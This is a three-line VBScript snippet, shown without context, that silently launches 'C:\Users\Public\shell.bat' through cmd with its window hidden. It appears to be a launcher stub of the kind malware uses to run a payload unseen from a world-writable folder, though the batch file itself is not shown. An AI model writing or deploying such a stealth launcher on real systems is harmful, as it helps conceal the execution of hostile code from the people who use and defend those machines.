Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c C:\Users\Public\shell.bat", 0, False
Set WshShell = Nothing
